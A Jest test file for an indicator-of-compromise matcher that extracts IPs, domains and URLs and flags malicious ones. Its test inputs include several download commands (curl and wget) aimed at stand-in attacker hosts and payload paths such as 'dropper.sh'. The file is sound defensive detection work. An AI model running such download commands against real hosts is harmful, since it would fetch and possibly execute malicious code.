const path = require('path');
const { IOCMatcher } = require('../../../lib/validation/engine/ioc');

const DB_PATH = path.join(__dirname, '..', '..', '..', 'config', 'security', 'ioc-database.json');

describe('IOCMatcher', () => {
  let matcher;
  beforeAll(() => { matcher = new IOCMatcher(DB_PATH); });

  describe('extractIPs', () => {
    it('should extract IPv4 addresses from content', () => {
      const ips = matcher.extractIPs('Connect to 192.0.2.1 and 10.0.0.1');
      expect(ips).toContain('192.0.2.1');
      expect(ips).toContain('10.0.0.1');
    });
  });

  describe('extractDomains', () => {
    it('should extract domains from content', () => {
      const domains = matcher.extractDomains('Visit evil-example.com or safe.org');
      expect(domains).toContain('evil-example.com');
    });
  });

  describe('extractURLs', () => {
    it('should extract URLs from content', () => {
      const urls = matcher.extractURLs('Go to https://evil-example.com/malware/payload.sh');
      expect(urls).toHaveLength(1);
      expect(urls[0]).toContain('evil-example.com');
    });
  });

  describe('matchContent', () => {
    it('should detect known malicious IP', () => {
      const findings = matcher.matchContent('curl http://192.0.2.1/install.sh', 'script.sh', 5);
      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].category).toBe('MALICIOUS_CODE');
      expect(findings[0].detector).toBe('ioc');
    });

    it('should detect known malicious domain', () => {
      const findings = matcher.matchContent('wget https://evil-example.com/payload', 'run.sh', 1);
      expect(findings.length).toBeGreaterThan(0);
    });

    it('should detect suspicious TLD', () => {
      const findings = matcher.matchContent('fetch("https://sketchy-site.tk/api")', 'app.js', 10);
      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].name).toMatch(/suspicious TLD/i);
    });

    it('should detect malicious URL pattern', () => {
      const findings = matcher.matchContent('curl https://some-host.com/malware/dropper.sh', 'run.sh', 1);
      expect(findings.length).toBeGreaterThan(0);
    });

    it('should return empty for clean content', () => {
      expect(matcher.matchContent('const x = 42;', 'safe.js', 1)).toHaveLength(0);
    });
  });

  describe('constructor with missing DB', () => {
    it('should handle nonexistent database gracefully', () => {
      const m = new IOCMatcher('/nonexistent/db.json');
      expect(m.matchContent('192.0.2.1', 'test.js', 1)).toHaveLength(0);
    });
  });
});
